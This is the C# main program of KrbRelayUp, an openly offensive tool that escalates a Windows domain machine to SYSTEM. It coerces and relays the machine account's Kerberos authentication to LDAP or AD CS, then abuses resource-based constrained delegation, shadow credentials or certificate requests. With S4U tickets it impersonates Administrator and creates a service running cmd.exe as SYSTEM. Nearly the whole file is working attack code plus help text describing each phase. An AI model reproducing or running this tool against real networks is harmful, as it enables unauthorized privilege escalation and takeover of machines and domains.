using System;
using System.DirectoryServices.Protocols;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;

namespace KrbRelayUp
{
    public static class Options
    {

        public enum PhaseType
        {
            System = 0,
            Relay = 1,
            Spawn = 2,
            KrbSCM = 3,
            Full = 4
        }

        public static PhaseType phase = PhaseType.System;

        // General Options
        public static string domain = null;
        public static string domainDN = "";
        public static string domainController = null;
        public static bool useSSL = false;
        public static int ldapPort = 389;
        public static bool useCreateNetOnly = false;
        public static bool verbose = false;

        // Relay Options
        public static Relay.RelayAttackType relayAttackType = Relay.RelayAttackType.RBCD;
        public static string relaySPN = null;
        public static string comServerPort = "12345";
        public static bool attackDone = false;
        public static string clsid = "90f18417-f0f1-484e-9d3c-59dceee5dbd8";

        // RBCD Method
        public static bool rbcdCreateNewComputerAccount = false;
        public static string rbcdComputerName = "KRBRELAYUP";
        public static string rbcdComputerPassword = null;
        public static string rbcdComputerPasswordHash = null;
        public static string rbcdComputerSid = null;
        
        // SHADOWCRED Method
        public static bool shadowCredForce = false;
        public static string shadowCredCertificate = null;
        public static string shadowCredCertificatePassword = null;

        // ADCS Method
        public static string caEndpoint = null;
        public static bool https = false;
        public static string certificateTemplate = "Machine";

        // Spawn Options
        public static string impersonateUser = "Administrator";
        public static string targetSPN = $"HOST/{Environment.MachineName.ToUpper()}";
        public static string targetDN = "";

        // KRBSCM Options
        public static string serviceName = "KrbSCM";
        public static string serviceCommand = null;
        public static void PrintOptions()
        {
            var allPublicFields = typeof(Options).GetFields();
            foreach (var opt in allPublicFields)
            {
                Console.WriteLine($"{opt.Name}:{opt.GetValue(null)}");
            }
        }

    }

    class Program
    {
        
        public static void GetHelp()
        {
            Console.WriteLine("FULL: Perform full attack chain. Options are identical to RELAY. Tool must be on disk.");
            Console.WriteLine("");
            Console.WriteLine("RELAY: First phase of the attack. Will Coerce Kerberos auth from local machine account, relay it to LDAP and create a control primitive over the local machine using RBCD or SHADOWCRED.");
            Console.WriteLine("Usage: KrbRelayUp.exe relay -d FQDN -cn COMPUTERNAME [-c] [-cp PASSWORD | -ch NTHASH]\n");
            Console.WriteLine("    -m   (--Method)                   Abuse method to use in after a successful relay to LDAP <rbcd/shadowcred> (default=rbcd)");
            Console.WriteLine("    -p   (--Port)                     Port for Com Server (default=12345)");
            Console.WriteLine("    -cls (--Clsid)                    CLSID to use for coercing Kerberos auth from local machine account (default=90f18417-f0f1-484e-9d3c-59dceee5dbd8)");
            Console.WriteLine("");
            Console.WriteLine("    # RBCD Method:");
            Console.WriteLine("    -c   (--CreateNewComputerAccount) Create new computer account for RBCD. Will use the current authenticated user.");
            Console.WriteLine("    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)");
            Console.WriteLine("    -cp  (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])");
            Console.WriteLine("");
            Console.WriteLine("    # SHADOWCRED Method:");
            Console.WriteLine("    -f   (--ForceShadowCred)          Clear the msDS-KeyCredentialLink attribute of the attacked computer account before adding our new shadow credentials. (Optional)");
            Console.WriteLine("");
            Console.WriteLine("    # ADCS Method:");
            Console.WriteLine("    -ca  (--CAEndpoint)               CA endpoint FQDN (default = same as DC)");
            Console.WriteLine("    -https                            Connect to CA endpoint over secure HTTPS instead of HTTP");
            Console.WriteLine("    -cet (--CertificateTemplate)      Certificate template to request for (default=Machine)");

            Console.WriteLine("\n");
            Console.WriteLine("SPAWN: Second phase of the attack. Will use the appropriate control primitive to obtain a Kerberos Service Ticket and will use it to create a new service running as SYSTEM.");
            Console.WriteLine("Usage: KrbRelayUp.exe spawn -d FQDN -cn COMPUTERNAME [-cp PASSWORD | -ch NTHASH] <-i USERTOIMPERSONATE>\n");
            Console.WriteLine("    -m   (--Method)                   Abuse method used in RELAY phase <rbcd/shadowcred> (default=rbcd)");
            Console.WriteLine("    -i   (--Impersonate)              User to impersonate. should be a local administrator in the target computer. (default=Administrator)");
            Console.WriteLine("    -s   (--ServiceName)              Name of the service to be created. (default=KrbSCM)");
            Console.WriteLine("    -sc  (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)");
            Console.WriteLine("");
            Console.WriteLine("    # RBCD Method:");
            Console.WriteLine("    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)");
            Console.WriteLine("    -cp  (--ComputerPassword)         Password of computer account for RBCD. (either -cp or -ch must be specified)");
            Console.WriteLine("    -ch  (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (either -cp or -ch must be specified)");
            Console.WriteLine("");
            Console.WriteLine("    # SHADOWCRED | ADCS Method:");
            Console.WriteLine("    -ce  (--Certificate)              Base64 encoded certificate or path to certificate file");
            Console.WriteLine("    -cep (--CertificatePassword)      Certificate password (if applicable)");

            Console.WriteLine("\n");
            Console.WriteLine("KRBSCM: Will use the currently loaded Kerberos Service Ticket to create a new service running as SYSTEM.");
            Console.WriteLine("Usage: KrbRelayUp.exe krbscm <-s SERVICENAME> <-sc SERVICECOMMANDLINE>\n");
            Console.WriteLine("    -s  (--ServiceName)              Name of the service to be created. (default=KrbSCM)");
            Console.WriteLine("    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)");

            Console.WriteLine("\n");
            Console.WriteLine("General Options:");
            Console.WriteLine("    -d  (--Domain)                   FQDN of domain. (Optional)");
            Console.WriteLine("    -dc (--DomainController)         FQDN of domain controller. (Optional)");
            Console.WriteLine("    -ssl                             Use LDAP over SSL. (Optional)");
            Console.WriteLine("    -n                               Use CreateNetOnly (needs to be on disk) instead of PTT when importing ST (enabled if using FULL mode)");
            Console.WriteLine("    -v  (--Verbose)                  Show verbose output. (Optional)");

            
            Console.WriteLine("");
        }

        static void ParseArgs(string[] args)
        {

            if (args.Length == 0)
            {
                GetHelp();
                Environment.Exit(0);
            }

            if (!Enum.TryParse<Options.PhaseType>(args[0], true, out Options.phase))
            {
                GetHelp();
                Console.WriteLine($"\n[-] Unrecognized Phase Type \"{args[0]}\"");
                Environment.Exit(0);
            }

            // General Options
            int iDomain = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(d|Domain)$").Match(s).Success);
            int iDomainController = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(dc|DomainController)$").Match(s).Success);
            int iSSL = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ssl)$").Match(s).Success);
            int iCreateNetOnly = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(n|CreateNetOnly)$").Match(s).Success);
            int iVerbose = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(v|Verbose)$").Match(s).Success);
            Options.domain = (iDomain != -1) ? args[iDomain + 1] : Options.domain;
            Options.domainController = (iDomainController != -1) ? args[iDomainController + 1] : Options.domainController;
            Options.useSSL = (iSSL != -1) ? true : Options.useSSL;
            if (Options.useSSL)
                Options.ldapPort = 636;
            Options.useCreateNetOnly = (iCreateNetOnly != -1) ? true : Options.useCreateNetOnly;
            Options.verbose = (iVerbose != -1) ? true : Options.verbose;

            // Relay Options
            int iMethod = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(m|Method)$").Match(s).Success);
            int iComServerPort = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(p|Port)$").Match(s).Success);
            int iClsid = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cls|Clsid)$").Match(s).Success);
            if (iMethod != -1)
            {
                if (!Enum.TryParse<Relay.RelayAttackType>(args[iMethod + 1], true, out Options.relayAttackType))
                {
                    GetHelp();
                    Console.WriteLine($"\n[-] Unrecognized RELAY attack type \"{args[iMethod + 1]}\"");
                    Environment.Exit(0);
                }
            }
            Options.comServerPort = (iComServerPort != -1) ? args[iComServerPort + 1] : Options.comServerPort;
            Options.clsid = (iClsid != -1) ? args[iClsid + 1] : Options.clsid;

            // RBCD Method
            int iCreateNewComputerAccount = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(c|CreateNewComputerAccount)$").Match(s).Success);
            int iComputerName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cn|ComputerName)$").Match(s).Success);
            int iComputerPassword = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cp|ComputerPassword)$").Match(s).Success);
            int iComputerPasswordHash = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ch|ComputerPasswordHash)$").Match(s).Success);
            Options.rbcdCreateNewComputerAccount = (iCreateNewComputerAccount != -1) ? true : Options.rbcdCreateNewComputerAccount;
            Options.rbcdComputerName = (iComputerName != -1) ? args[iComputerName + 1].TrimEnd('$') : Options.rbcdComputerName;
            Options.rbcdComputerPassword = (iComputerPassword != -1) ? args[iComputerPassword + 1] : Options.rbcdComputerPassword;
            Options.rbcdComputerPasswordHash = (iComputerPasswordHash != -1) ? args[iComputerPasswordHash + 1] : Options.rbcdComputerPasswordHash;

            // SHADOWCRED Method
            int iShadowCredForce = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(f|ForceShadowCred)$").Match(s).Success);
            int iShadowCredCertificate = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ce|Certificate)$").Match(s).Success);
            int iShadowCredCertificatePassword = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cep|CertificatePassword)$").Match(s).Success);
            Options.shadowCredForce = (iShadowCredForce != -1) ? true : Options.shadowCredForce;
            Options.shadowCredCertificate = (iShadowCredCertificate != -1) ? args[iShadowCredCertificate + 1] : Options.shadowCredCertificate;
            Options.shadowCredCertificatePassword = (iShadowCredCertificatePassword != -1) ? args[iShadowCredCertificatePassword + 1] : Options.shadowCredCertificatePassword;

            // ADCS Method
            int iCAEndpoint = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ca|CAEndpoint)$").Match(s).Success);
            int iHttps = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(https)$").Match(s).Success);
            int iCertificateTemplate = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cet|CertificateTemplate)$").Match(s).Success);
            Options.caEndpoint = (iCAEndpoint != -1) ? args[iCAEndpoint + 1] : Options.caEndpoint;
            if (!String.IsNullOrEmpty(Options.caEndpoint))
            {
                try
                {
                    //Options.caEndpoint = new Uri(Options.caEndpoint).Host; <- This somewhat messed with the execuutionflow when a users enters httpx://server.domain.bla/bla
                    //new method with regex insted of Uri.host method
                    Options.caEndpoint = Regex.Replace(Options.caEndpoint, @"^([a-zA-Z]+:\/\/)?([^\/]+)\/.*?$", "$2");
                }
                catch { }
            }
            Options.https = (iHttps != -1) ? true : Options.https;
            Options.certificateTemplate = (iCertificateTemplate != -1) ? args[iCertificateTemplate + 1] : Options.certificateTemplate;

            // Spawn Options
            int iImpersonateUser = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(i|Impersonate)$").Match(s).Success);
            Options.impersonateUser = (iImpersonateUser != -1) ? args[iImpersonateUser + 1] : Options.impersonateUser;

            // KRBSCM Options
            int iServiceName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(s|ServiceName)$").Match(s).Success);
            int iServiceCommand = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(sc|ServiceCommand)$").Match(s).Success);
            Options.serviceName = (iServiceName != -1) ? args[iServiceName + 1] : Options.serviceName;
            Options.serviceCommand = (iServiceCommand != -1) ? args[iServiceCommand + 1] : Options.serviceCommand;

        }

        static void Main(string[] args)
        {
            Console.WriteLine("KrbRelayUp - Relaying you to SYSTEM\n");

            ParseArgs(args);

            if (Options.phase == Options.PhaseType.System)
            {
                try
                {
                    KrbSCM.RunSystemProcess(Convert.ToInt32(args[1]));
                }
                catch { }
                return;
            }
            else if (Options.phase == Options.PhaseType.KrbSCM)
            {
                KrbSCM.Run();
                return;
            }

            // If domain or dc is null try to find the them automatically
            if (String.IsNullOrEmpty(Options.domain) || String.IsNullOrEmpty(Options.domainController))
            {
                if (!Networking.GetDomainInfo())
                    return;
            }

            // Check if domain controller is an IP and if so try to resolve it to the DC FQDN
            if (!String.IsNullOrEmpty(Options.domainController))
            {
                Options.domainController = Networking.GetDCNameFromIP(Options.domainController);
                if (String.IsNullOrEmpty(Options.domainController))
                {
                    Console.WriteLine("[-] Could not find Domain Controller FQDN From IP. Try specifying the FQDN with --DomainController flag.");
                    return;
                }
            }


            if (Options.phase == Options.PhaseType.Relay || Options.phase == Options.PhaseType.Full)
            {
                Console.WriteLine();

                // Set required variables for relay
                if (Options.relayAttackType == Relay.RelayAttackType.ADCS)
                {
                    if (String.IsNullOrEmpty(Options.caEndpoint))
                        Options.caEndpoint = Options.domainController;
                    Options.relaySPN = $"http/{Options.caEndpoint}";
                }
                else
                {
                    Options.relaySPN = $"ldap/{Options.domainController}";
                }
                Options.domainDN = Networking.GetDomainDN(Options.domain);

                // Initialize COM Server for relaying Kerberos auth from NT/SYSTEM to LDAP
                Relay.Relay.InitializeCOMServer();

                // Bind to LDAP using current authenticated user
                LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(Options.domainController, Options.ldapPort);
                LdapConnection ldapConnection = new LdapConnection(identifier);
                
                // spoppi make SSL work 
                if (Options.useSSL)
                {
                    ldapConnection.SessionOptions.ProtocolVersion = 3;
                    ldapConnection.SessionOptions.SecureSocketLayer = true;
                }
                else // test showed that these options are mutually exclusive
                {
                    ldapConnection.SessionOptions.Sealing = true;
                    ldapConnection.SessionOptions.Signing = true;
                }

                ldapConnection.Bind();

                if (Options.relayAttackType == Relay.RelayAttackType.RBCD)
                {
                    // Create new computer account if flag is enabled
                    if (Options.rbcdCreateNewComputerAccount)
                    {
                        // Generate random passowrd for the new computer account if not specified
                        if (String.IsNullOrEmpty(Options.rbcdComputerPassword))
                            Options.rbcdComputerPassword = RandomPasswordGenerator(16);

                        AddRequest request = new AddRequest();
                        request.DistinguishedName = $"CN={Options.rbcdComputerName},CN=Computers,{Options.domainDN}";
                        request.Attributes.Add(new DirectoryAttribute("objectClass", "Computer"));
                        request.Attributes.Add(new DirectoryAttribute("SamAccountName", $"{Options.rbcdComputerName}$"));
                        request.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));
                        request.Attributes.Add(new DirectoryAttribute("DnsHostName", $"{Options.rbcdComputerName}.{Options.domain}"));
                        request.Attributes.Add(new DirectoryAttribute("ServicePrincipalName", $"HOST/{Options.rbcdComputerName}.{Options.domain}", $"RestrictedKrbHost/{Options.rbcdComputerName}.{Options.domain}", $"HOST/{Options.rbcdComputerName}", $"RestrictedKrbHost/{Options.rbcdComputerName}"));
                        request.Attributes.Add(new DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes($"\"{Options.rbcdComputerPassword}\"")));

                        try
                        {
                            DirectoryResponse res = ldapConnection.SendRequest(request);
                            Console.WriteLine($"[+] Computer account \"{Options.rbcdComputerName}$\" added with password \"{Options.rbcdComputerPassword}\"");
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine($"[-] Could not add new computer account:");
                            Console.WriteLine($"[-] {e.Message}");
                            return;
                        }
                    }

                    // Get Computer SID for RBCD
                    Options.rbcdComputerSid = GetObjectSidForComputerName(ldapConnection, Options.rbcdComputerName, Options.domainDN);

                }

                Relay.Relay.Run();

            }


            if (Options.phase == Options.PhaseType.Spawn || (Options.phase == Options.PhaseType.Full && Options.attackDone))
            {
                byte[] bFinalTicket = null;
                if (Options.relayAttackType == Relay.RelayAttackType.RBCD)
                {
                    Interop.KERB_ETYPE eType = new Interop.KERB_ETYPE();
                    string hash = null;

                    if (!String.IsNullOrEmpty(Options.rbcdComputerPassword))
                    {
                        string salt = $"{Options.domain.ToUpper()}host{Options.rbcdComputerName.ToLower()}.{Options.domain.ToLower()}";
                        hash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.aes256_cts_hmac_sha1, Options.rbcdComputerPassword, salt);
                        eType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                    }
                    else if (!String.IsNullOrEmpty(Options.rbcdComputerPasswordHash))
                    {
                        hash = Options.rbcdComputerPasswordHash;
                        eType = Interop.KERB_ETYPE.rc4_hmac;
                    }

                    byte[] bInnerTGT = AskTGT.TGT($"{Options.rbcdComputerName}$", Options.domain, hash, eType, outfile: null, ptt: false);
                    KRB_CRED TGT = new KRB_CRED(bInnerTGT);
                    if (Options.verbose)
                        Console.WriteLine($"[+] VERBOSE: Base64 TGT for {Options.rbcdComputerName}$:\n    {Convert.ToBase64String(TGT.RawBytes)}\n");

                    KRB_CRED elevateTicket = S4U.S4U2Self(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: false);
                    if (Options.verbose)
                        Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.rbcdComputerName}$@{Options.domain}:\n    {Convert.ToBase64String(elevateTicket.Encode().Encode())}\n");

                    bFinalTicket = S4U.S4U2Proxy(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: (Options.phase != Options.PhaseType.Full), tgs: elevateTicket);
                    if (Options.verbose)
                        Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.targetSPN}:\n    {Convert.ToBase64String(bFinalTicket)}\n");
                }
                else if (Options.relayAttackType == Relay.RelayAttackType.ShadowCred || Options.relayAttackType == Relay.RelayAttackType.ADCS)
                {
                    byte[] bInnerTGT = AskTGT.TGT($"{Environment.MachineName}$", Options.domain, Options.shadowCredCertificate, Options.shadowCredCertificatePassword, Interop.KERB_ETYPE.aes256_cts_hmac_sha1, outfile: null, ptt: false, getCredentials: Options.verbose);
                    KRB_CRED TGT = new KRB_CRED(bInnerTGT);
                    if (Options.verbose)
                        Console.WriteLine($"\n[+] VERBOSE: Base64 TGT for {Environment.MachineName}$:\n    {Convert.ToBase64String(TGT.RawBytes)}\n");

                    KRB_CRED elevateTicket = S4U.S4U2Self(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: false);
                    if (Options.verbose)
                        Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.rbcdComputerName}$@{Options.domain}:\n    {Convert.ToBase64String(elevateTicket.Encode().Encode())}\n");

                    bFinalTicket = LSA.SubstituteTGSSname(elevateTicket, Options.targetSPN, ptt: (Options.phase != Options.PhaseType.Full));
                    if (Options.verbose)
                        Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.targetSPN}:\n    {Convert.ToBase64String(bFinalTicket)}\n");
                }

                System.Threading.Thread.Sleep(1500);

                if (Options.phase == Options.PhaseType.Full || Options.useCreateNetOnly)
                {
                    string finalCommand = $"{System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName} krbscm";
                    if (!String.IsNullOrEmpty(Options.serviceName))
                        finalCommand = $"{finalCommand} --ServiceName \"{Options.serviceName}\"";
                    if (!String.IsNullOrEmpty(Options.serviceCommand))
                        finalCommand = $"{finalCommand} --ServiceCommand \"{Options.serviceCommand}\"";
                    Helpers.CreateProcessNetOnly(finalCommand, show: false, kirbiBytes: bFinalTicket);
                }
                else
                {
                    KrbSCM.Run();
                }

            }
        }

        public static string GetObjectSidForComputerName(LdapConnection ldapConnection, string computerName, string searchBase)
        {
            string searchFilter = $"(sAMAccountName={computerName}$)";
            SearchRequest searchRequest = new SearchRequest(searchBase, searchFilter, SearchScope.Subtree, "DistinguishedName", "objectSid");
            try
            {
                SearchResponse response = (SearchResponse)ldapConnection.SendRequest(searchRequest);
                return (new SecurityIdentifier((byte[])response.Entries[0].Attributes["objectSid"][0], 0)).ToString();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Could not find computer account SID:");
                Console.WriteLine($"[-] {e.Message}");
                Environment.Exit(0);
            }
            return null;
        }

        public static string RandomPasswordGenerator(int length)
        {
            string alphaCaps = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            string alphaLow = "abcdefghijklmnopqrstuvwxyz";
            string numerics = "1234567890";
            string special = "@#$-=/";
            string[] allChars = { alphaLow, alphaCaps, numerics, special };
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            int t = 0;
            while (0 < length--)
            {
                res.Append(allChars[t][rnd.Next(allChars[t].Length)]);
                if (t == 3)
                    t = 0;
                else
                    t++;
            }
            return res.ToString();
        }
    }
}
